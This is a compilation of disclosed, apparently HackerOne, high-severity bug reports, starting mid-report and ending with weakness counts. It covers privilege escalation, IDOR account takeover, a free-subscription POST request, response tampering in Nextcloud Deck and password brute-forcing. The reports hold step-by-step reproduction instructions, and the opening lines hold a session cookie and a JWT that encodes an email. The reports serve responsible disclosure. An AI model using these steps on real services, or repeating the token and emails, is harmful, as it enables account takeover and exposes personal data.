+Cookie: stripe_mid=f1a62f3d-2ba4-4742-a1ae-97c309223fec; stripe_sid=20155b5b-e547-4e52-9c4c-53fd4b08ed8a; _ga=GA1.2.472610903.1575449565; _gid=GA1.2.1705021668.1575449565; _fbp=fb.1.1575449579810.16963820; token=eyJhbGciOiJIUzI1NiJ9.eyJzZWN1cml0eUNvbnRleHQiOiJ7XCJ1c2VySW5mb1wiOntcImlkXCI6MTMwODUxLFwiZW1haWxcIjpcImFiZGVsbGFobmFkaTNAZ21haWwuY29tXCIsXCJsb2NhbGVLZXlcIjpcImVuXCIsXCJmaXJzdE5hbWVcIjpcInRlc3Q0NVwiLFwibGFzdE5hbWVcIjpcIm5cIixcImdhSWRcIjpcImJiYzBkNGExLWI5NDYtNDIwMy1iOTNmLTcxNjhmYmEyMWI5ZVwiLFwicGhvbmVzXCI6W10sXCJhY3RpdmVcIjpmYWxzZSxcImFjdGl2ZVByb2plY3RJZFwiOjEzNzg3NyxcImlzU3VwZXJVc2VyXCI6ZmFsc2UsXCJzdXBlclVzZXJWMlwiOmZhbHNlLFwib25seUZiQ3JlZGVudGlhbHNcIjpmYWxzZSxcInNldHRpbmdzRW1haWxTb3J0QnlcIjpcImNyZWF0ZWRUaW1lXCIsXCJzZXR0aW5nc0VtYWlsU29ydEFzY1wiOmZhbHNlLFwic2V0dGluZ3NUZW1wbGF0ZVNvcnRCeVwiOlwidXBkYXRlZFRpbWVcIixcInNldHRpbmdzVGVtcGxhdGVTb3J0QXNjXCI6ZmFsc2UsXCJjb2xvclwiOlwiI2ZiYTc2ZlwiLFwib3JnYW5pemF0aW9uSWRcIjoxMzA2NjUsXCJzdWJzY3JpcHRpb25UeXBlXCI6XCJGUkVFXCIsXCJjb25zZW50UmVjZWl2ZWRcIjp0cnVlLFwidGVtcGxhdGVDcmVhdGVkT25Mb2dpblwiOmZhbHNlLFwiZmlyc3RMb2dpblwiOmZhbHNlfSxcImlzc3VlZEF0XCI6MTU3NTQ1MDIzMDMxOH0ifQ.GidxPLc4Wu80JWxScUjLrq4nmLr2lEamONcWsATBQfY; intercom-session-b1m243ec=Tlk4aHpydmFMOTc5SlZRaGRabE43WUIwanoxdXAyNlowR3FWbE9oaXNDRm5mYlhRRHNBNjlyLzJOOWQybmtYQi0tZzUrdnd1enBReWhPM0J3M1N2SFIzUT09--a917964bb8221fad0a6d3e38fab8cde2af1efed4
+{"repository":{},"idField":"id","entityType":"USER","id":135628,"role":"admin","organizationId":135428,"firstName":"TESt","lastName":"account","color":"#cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false}
+http response :
+HTTP/1.1 200
+Server: nginx
+Date: Wed, 04 Dec 2019 09:56:41 GMT
+Content-Type: application/json;charset=UTF-8
+Connection: close
+Vary: Accept-Encoding
+█████████
+████
+X-Frame-Options: sameorigin
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Content-Length: 180
+█████cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false}
+i hope it is clear ,
+thanks
+Impact
+an attacker ( already admin ) can remove the owner from his role , and the last one can not login any more to his account
+
+
+
+==================================================
+
+Report File: 796379.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Summary:
+Hello.
+Due to insufficient access controls and poor implementation of the registration at https://████████/████/login.cfm it was possible to register while privilege escalating to an administrator.
+Description:
+It was possible to tamper with the registration request at https://█████████/██████/screen_questions.cfm which is aimed to ███████ applications for education in order to sign-up with administrator privileges. As a result, it was possible to gain access to personally identifiable information (PII) of all the applicants in the system, including SSNs, names, phones and emails.
+At this point I stopped digging further and I started writing this report.
+Note: Please can you liaise with the system's administrator and kindly ask them to remove the below accounts from the system after this has been triaged and resolved:
+Code 61 Bytes
+1██████
+2█████████
+3███
+4█████████
+5██████
+6███
+7█████████
+8█████████
+Apologies for creating all these accounts, most of them are just low privileged applicants, but I was confused as to why this attack worked and it took few attempts to figure it out.
+Please let me know when this is resolved and I will remove any evidence that include PII data from my local system which are only kept locally.
+Impact
+An attacker can gain administrative access in the system allowing them to expose sensitive PII information, such as including SSNs, names, phones and emails. Having this access, an attacker could completely take over the website and perform further attacks against it from this authenticated viewpoint - however I did not perform this. Attackers may sell this PII information on black-markets for profit.
+If this was exploited and published there would be severe reputational and legal ramifications for DoD.
+Step-by-step Reproduction Instructions
+Initially, enable your web intercepting proxy such as Burp Suite
+Next, browse to the initial registration page at: https://████/████████/screen_questions.cfm and choose options in the dropdown lists: █████████
+Next, you will be taken at the actual registration page at https://████/████████/newuser.cfm?loc_class=L (you can probably skip step 2 and come right here)
+Fill in this form with some information and a legitimate looking SSN number. Keep in mind that if the SSN is registered in the system, the website will error, so you will have to try another one.
+Intercept the request and modify it so that the user_type parameter has value 4, and the fname and lname parameters have values Hackerone<% and test<%xss. I believe it is <% that is causing this privilege escalate issue, but as I am not 100% positive I am giving you the full values. The request should look like mine: █████
+If all went well, you should be logged in and prompted with a Privacy page which you need to accept.
+Notice how this account has administrator access, an example is shown below: █████████
+Finally, I created 2 short PoC videos showing how I was able to register as admin and how I was able to access PII data:
+Create admin account video: ██████
+Access PII data video: {F716040}
+Product, Version, and Configuration (If applicable)
+The https://█████████ website is under █████████ which is part of DoD, as shown: █████████
+Suggested Mitigation/Remediation Actions
+Unfortunately, I am not 100% positive on what exactly is causing this flaw, but injection of <% is required. This could be mitigated by applying strict user input validation in the fname and lname fields. Please see the link below for more information:
+https://owasp.org/www-project-cheat-sheets/cheatsheets/Input_Validation_Cheat_Sheet
+I would also recommend that you review the current user access types and levels in accordance with the findings above to ensure that setting the user_type to other numbers than the default one when registering (5) does not allow users to gain more privileges than they are authorized to.
+Additionally, review the whole codebase for broken access control, the following cheatsheet from OWASP provides more information:
+https://owasp.org/www-project-cheat-sheets/cheatsheets/Access_Control_Cheat_Sheet
+Finally, the web application appears to be very susceptible to common web application attacks and I would recommend that this undertakes a full thorough security test if possible or a code review, if of course it is required and cannot be decommissioned.
+PS: I will do my best to submit reports in terms of the rest of flaws I was able to spot while looking at it.
+Impact
+An attacker can gain administrative access in the system allowing them to expose sensitive PII information, such as including SSNs, names, phones and emails. Having this access, an attacker could completely take over the website and perform further attacks against it from this authenticated viewpoint - however I did not perform this. Attackers may sell this PII information on black-markets for profit.
+If this was exploited and published there would be severe reputational and legal ramifications for DoD.
+
+
+
+==================================================
+
+Report File: 827816.json
+------------------------------
+Report To: Nextcloud
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Author: Silvia Väli, Clarified Security (https://www.clarifiedsecurity.com/silvia-vali/)
+Date: 24th of March, 2020
+Description:
+When the regular user is visiting the Deck view, all created boards are displayed along with the ones that are shared with the user by others. Available functionality within each of the shared boards depends whether the user has received share, manage, edit permissions.
+Since the access control rules related to user’s permissions have only been applied on the client side and not on the server side, user can specify share/edit/manage permissions to be always true within the response (for example by using a proxy tool) when viewing board information. This way he can gain control over the board so he/she could apply the missing edit/manage permissions to him/herself directly from the UI.
+Version information:
+Nextcloud 18.0.2
+Deck 0.8.0 enabled
+Pre-requisites as an admin user to follow the vulnerable path:
+create 2 regular users in the next cloud, for example user silvia and user john. Users do not belong to the admin group.
+Install the Deck app (installed version 0.8.0)
+To reproduce the vulnerable path:
+User: silvia
+Authenticate as user silvia and select Deck from the menu
+Create new board -> name it (“board for testing”)
+Add a new stack (“test test”)
+Click on “Show board for details”
+Add the other user john and only give him Share permission. Uncheck Edit and Manage.
+User: john
+Now authenticate in the application as john -> click Deck from the menu and open the shared board “board for testing”. Since the board was only Shared and no edit permissions were granted, john cannot do much on the board.
+What john can do however is use a proxy tool such as Burp Suite to modify the response body. When john clicks on the Deck from the menu, following request is made:
+Code 79 Bytes
+1GET /apps/deck/boards HTTP/1.1
+2Host: next.yy.ee
+3...
+4Connection: close
+5Cookie: …
+In the response to that request, you can see that john only been given the permission to share which only allows to read the data and not modify it.
+Code 535 Bytes
+1[{"title":"board for testing",
+2"owner":{"primaryKey":"silvia","uid":"silvia","displayname":"silvia"},"color":"0082c9","archived":false,"labels":[],"acl":[{"participant":{"primaryKey":"john","uid":"john","displayname":"john"},"type":0,"boardId":7,"permissionEdit":false,"permissionShare":true,"permissionManage":false,"owner":false,"id":4}],"permissions":{"PERMISSION_READ":true,"PERMISSION_EDIT":false,"PERMISSION_MANAGE":false,"PERMISSION_SHARE":true},"users":[],"shared":1,"stacks":[],"deletedAt":0,"lastModified":1585045324,"id":7}]
+john however uses a proxy tool such as Burp Suite and applies via proxy -> options -> Match and replace that every time the following line with permissions is seen modify all the options to be equal to true.
+Original: "permissionEdit":false,"permissionShare":true,"permissionManage":false,"owner":false
+Modified: "permissionEdit":true,"permissionShare":true,"permissionManage":true,"owner":true
+If john now refreshes the Deck page and opens the board “board for testing” -> Show board details -> Sharing -> he can add himself the permissions to Edit, Share, Manage to take over the board which was initially only shared with him.
+Impact
+Attacker would achieve control over the board and its data/attachment uploads etc.
+
+
+
+==================================================
+
+Report File: 837510.json
+------------------------------
+Report To: Elastic
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Summary:
+Dear Team,
+Today when doing some recon steps and found this subdomain
+https://54.246.136.164/
+Its not loaded correctly and viewing the source code exposed some other links interesting
+https://elasticsandbox.docebosaas.com/pages/14/learner-dashboard
+https://auth-sandbox.elastic.co
+Go to https://elasticsandbox.docebosaas.com/learn and using SIGNIN WITH SAML SSO leading to
+https://staging.found.no/login?fromURI=https%3A%2F%2Fauth-sandbox.elastic.co%2Fapp%2Felasticcoexternal_docebo_1%2Fexkigtmda9ejVUCM70h7%2Fsso%2Fsaml%3FSAMLRequest%3DnVJNb9swDP0rhu6O%252FBE3sRBnyBIMC9BuQZ32sEsgy0yjTZY0Ud68fz%252FFSbH2ksNOAim%252B9%252FhILpB3yrJV70%252F6EX72gD4aOqWRjR8V6Z1mhqNEpnkHyLxg9erhnmWThFlnvBFGkTeQ2wiOCM5Lo0m03VTk0DTzMj%252B2YlYWjeDHpk3zsiggnxfibppnWXonoMyKNM9I9AwOA7IigSjAEXvYavRc%252B5BKsiROpnGS7dM5m%252BasmH4j0Sa4kZr7EXXy3iKjlAerMXLdNmaYgOKhREyEodxaeg2FgcGD01wdWiOgMYeUwvBDvviu5SV8f35aP8yS04wiGno2TaLVq7G10dh34Gpwv6SAp8f7f9JX%252BlfxCzdyjkG%252Fo6pDKnULw8Se7AdX1bKzCupAvwqtvY860%252FYKcBSnaMc3i7nAM5a2cOS98jFaEu2uO%252FoYqKV%252Bub2e5lKE7PN%252Bv4t3X%252Bs9WS7O3Gwct1v%252Bh5MFfUuwuNzblyC93eyMkuJP9Mm4jvvbnZ0zso2PYynzjmuUoH0YvFLm99oB91AR73ogdHmRfH%252FVy78%253D%26RelayState%3Dhttps%253A%252F%252Felasticsandbox.docebosaas.com%252Flms%252Findex.php%253Fr%253Dsite%252Fsso%2526sso_type%253Dsaml
+At the website https://staging.found.no/ use Signup function allow me to register 2 accounts below
+superman85@wearehackerone.com
+support@elastic.co
+After login https://auth-sandbox.elastic.co/app/UserHome my account dashboard from superman85@wearehackerone.com is different with support@elastic.co.
+On account support@elastic.co I can view some interesting apps like Elastic Cloud Admin (QA-Canary) etc ...
+I have tried to launch apps and successful authorization this
+https://adminconsole-qa-eu-west-1.aws.qa.cld.elstc.co/deployments
+I do not do anything after logged in adminconsole. My IP address is █████
+<image_0>
+Go to https://staging.found.no/ and Signup an account with email @elastic.co
+<image_1>
+<image_2>
+Impact
+With this vulnerability an attacker was allowed to view apps only visible to employees with email @elastic.co
+
+
+
+==================================================
+
+Report File: 869450.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Summary:
+A malicious user can open an incident for any user via the ████/████████ page. This would allow the attacker to trick the victim into taking actions such as clicking a link or opening a file that has been attached to the incident.
+Impact
+A victim could be tricked into visiting a link, opening a file, or sending PII to the attacker via the incident. Because the attacker opened the incident, they can see all comments left by the victim.
+Step-by-step Reproduction Instructions
+Browse to ████ and create an account or login.
+Browse to ██████████/█████████. You will be able to create an incident on this page.
+In the █████████ field, you can select any user you want to assign the incident to. The i button beside the caller field also allows you to view various PII about the user. ███████ ██████
+You can attach files in the top right corner using the attachment button.
+Once you have chosen a victim (██████) and filled in the additional comments section with your phishing message, you can click Submit in the top right corner. ██████
+Browse to ███████/home.do and you can see a list of your open incidents. You may need to filter by All.
+Click the incident that you assigned to the victim. ███████
+You can now use this page to monitor the victims response. This could be used to communicate with the victim, posing as an administrator and soliciting PII or causing other malicious effects. █████████
+The victim will receive an e-mail that the incident has been submitted on their behalf. Once they log-in, they will see the following: ██████████ ███████
+Obviously an adversary would create an account posing as an Air University administrator or something believable, but here is what a phishing attempt could look like using this vulnerability: ███
+Meanwhile, the attacker is monitoring the incident waiting on the victim to respond and can even see when the victim has viewed the incident. ███
+Suggested Mitigation/Remediation Actions
+This feature should be locked down to administrative access only. Regular users should not be allowed to submit tickets directly to other users or view other users PII.
+Impact
+A victim could be tricked into visiting a link, opening a file, or sending PII to the attacker via the incident. Because the attacker opened the incident, they can see all comments left by the victim.
+
+
+
+==================================================
+
+Report File: 915110.json
+------------------------------
+Report To: Automattic
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Summary:
+<image_0>
+Steps To Reproduce:
+Go to https://app.crowdsignal.com/users/list-users.php with your team account
+Invite an existing email (write victim's email)
+And click to confirmation link with your account
+You will log-in to victim's account directly
+PoC video :
+Impact
+Account Takeover without user interaction
+Thanks,
+Bugra
+
+
+
+==================================================
+
+Report File: 950881.json
+------------------------------
+Report To: Automattic
+Severity: HIGH
+Weaknesses:
+- Insecure Direct Object Reference (IDOR)
+
+Contents:
+
+Summary:
+Hi team,
+I created an account on Atavist and checked my settings page.
+I can change my email at https://magazine.atavist.com/cms/reader/account with this request :
+<image_0>
+And as you can see, there is a id parameter on request data. It's our user ID, and it's vulnerable for IDOR. So we can change any user's email address.
+Also user IDs are sequential so an attacker can change all accounts' email.
+Steps To Reproduce:
+1.Go to https://magazine.atavist.com/login and Login to your account
+Go to https://magazine.atavist.com/cms/reader/account and open your proxy program
+Change the email and click Save
+In request, change the ID to your test account's ID
+Forward the request
+Now you can reset victim's password via https://magazine.atavist.com/forgot
+Impact
+Account Takeover without user interaction
+Thanks,
+Bugra
+
+
+
+==================================================
+
+Report File: 951230.json
+------------------------------
+Report To: Automattic
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Summary:
+Hi team
+If you go to https://magazine.atavist.com/ and scroll down. You will see membership price is $25, but I found a way to buy this subscription for free via Gift feature.
+When you send gift request before adding any credit card to your account you will see this response :
+<image_0>
+However, if you check the gift recipient's email you will see the Gift email that contains the gift link.
+<image_1>
+Steps To Reproduce:
+Just send this request (change YOUR_EMAIL, YOUR_PASSWORD, RECIPIENT_EMAIL, gift_timestamp to current date, it was 2020-8-4 while reporting this) :
+Code 670 Bytes
+1POST /api/v2/store/purchase.php HTTP/1.1
+2Host: magazine.atavist.com
+3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+4Accept: application/json, text/javascript, */*; q=0.01
+5Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+6Accept-Encoding: gzip, deflate
+7Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+8Content-Length: 204
+9Origin: https://magazine.atavist.com
+10DNT: 1
+11Connection: close
+12Referer: https://magazine.atavist.com/
+13
+14email=YOUR_EMAIL&password=YOUR_PASSWORD&product_id=com.theatavist.atavist.subscription.membership&gift_timestamp=2020-8-4&gift_recipient=RECIPIENT_EMAIL&gift_message=test&gift_gifter=test
+You will see {"error":"invalid_request_error","error_description":"The customer must have an active payment source attached."} in response but if you check the recipient's email, you will see the gift link.
+Impact
+Able to buy magazine membership for free
+Thanks,
+Bugra
+
+
+
+==================================================
+
+Report File: 969223.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Insecure Direct Object Reference (IDOR)
+
+Contents:
+
+Hello Team!
+Summary:
+I found when you wish to update your profile on https://███████/ after your login through https://██████████/signIn/signIn.html website due to an IDOR.
+This IDOR gives you the opportunity to change the origin email for the registered account by changing the ID parameter on the following request, i assume that if i would do it on the id=1 i would takeover the admin account, this is due to not requiring the OLD password to make an email change, aswell as no restriction to make POST actions on different account IDS.
+Description:
+IDOR chained to full Account Takeover on ██████ domain.
+Account
+## Step-by-step Reproduction Instructions
+Register an account at https://█████████/signIn/CreateAccount.html (Attacker)
+Login to your account and go the https://███████/signIn/account page
+Click on the "update" button located at thetop middle, and capture the request on BURP
+Now change the ID parameter on the request to the victims, change the email, and you successfully have managed to switch his email.
+Request:
+███
+Video PoC:
+█████
+Suggested Mitigation/Remediation Actions
+Implementing email request change based on OLD password input
+Returning 403/401 when user account attempts to change another user ID settings.
+Disclaimer
+as you might notice the domain is https://██████/signIn/signIn.html when you sign in (.mil site), and it redirects you afterwards to https://██████████/ with the Compromised account, therefore i considered this In Scope.
+Best Regards,
+Nagli
+Impact
+Issuing the malicious request on the victim account ID will lead to account takeover by replacing the email of the victim with the email of the attacker, and requesting a new password using the Forgot password option.
+
+
+
+==================================================
+
+Report File: 970157.json
+------------------------------
+Report To: X (Formerly Twitter)
+Severity: HIGH
+Weaknesses:
+- Improper Authentication - Generic
+
+Contents:
+
+Summary:This additional security measure from twitter provides protection to the victim's account, considering that a victim's session may have been hijacked by a hacker, however, due to this additional layer of security Implemented by twitter the hacker would not be able to change the victim's Password, as they will be prompted to enter the victim's account password In order to make these changes, which will not be known to a hacker (In case of a session hijack)
+This report is to bring to your attention a security vulnerability that will allow hackers that have hijacked a user's session to bypass the password screen (Without knowing the user's password)
+Description: For users that have had their twitter session hijacked, this security vulnerability would enable a hacker to completely take over a victim's account as they will be able to change the victim's password by bypassing the old password by the umrestricted rate limit or bruteforcing in the password
+Steps To Reproduce:
+With the assumption that the victim's twitter session is 'hijacked' and in a 'logged in' state for the hacker. The below steps must be followed In order to reproduce the security vulnerability.
+Security Vulnerability #1 - Update Victim's Password - Bypass old password by unrestricted rate limiting
+1.Go to Settings and Privacy -> Accounts
+2.Click on Email -> Password
+3.Enter any random password and Click on 'Next'
+4.Intercept the request the above request and send it to intruder
+5.Then select the position old password
+6.Then go in payload add password list
+7.Then start the attack bcoz of no rate limit the password bruteforcing is continue and find the correct password and update the old one
+Resolution: Apply the Rate Limitation
+Supporting Material/References:
+Impact
+This a serious security vulnerability, as It could lead to a hacker completely taking over the user's account by overriding twitter's security protocol as they could use this technique to bypass the password and it use to fully takeover the victim password
+
+
+
+==================================================
+
+Report File: 995347.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Description:
+The following param allows an attacker to trick people into downloading malicious files, scripts and other payloads.
+https://██████████?url=https://<MaliciousURL>
+PoC
+I will show you how the page looks normally without any changes. If you directly access https://███ you will be shown the following page. You can click on 'Click to download' but nothing happens.
+█████
+I replace the download param with the url param and entered my attacking vps server ip address as the URL and execute.
+█████
+On my attacking vps server (The black console) you can see that i have received the request from my personal computers ip address showing that it is 100% possible to perform this attack.
+https://██████████?url=https://████/poc
+████████
+Impact
+If an attacker abuses this vulnerability he/she will be able to compromise accounts, computers and identities of people. Potentially Military staff if the attacker had bad intentions.
+Step-by-step Reproduction Instructions
+Navigate to https://███████
+Click on 'Click to download'
+Replace download with url
+Type in a url and click download
+Product, Version, and Configuration (If applicable)
+Suggested Mitigation/Remediation Actions
+Dev needs to add validation to the url param so that it doesn't allow external resources to be downloadable.
+Resources:
+The only article i can find pertaining to this type of vulnerability
+https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
+Impact
+If an attacker abuses this vulnerability he/she will be able to compromise accounts, computers and identities of people. Potentially Military staff if the attacker had bad intentions.
+
+
+
+==================================================
+
+
+WEAKNESS STATISTICS FOR HIGH SEVERITY WEB APP REPORTS
+==================================================
+
+Total HIGH severity reports found: 41
+
+Improper Access Control - Generic: 20 occurrence(s)
+Insecure Direct Object Reference (IDOR): 7 occurrence(s)
+Improper Authentication - Generic: 6 occurrence(s)
+Privilege Escalation: 5 occurrence(s)
+Incorrect Authorization: 1 occurrence(s)
+Authentication Bypass Using an Alternate Path or Channel: 1 occurrence(s)
+Improper Authorization: 1 occurrence(s)
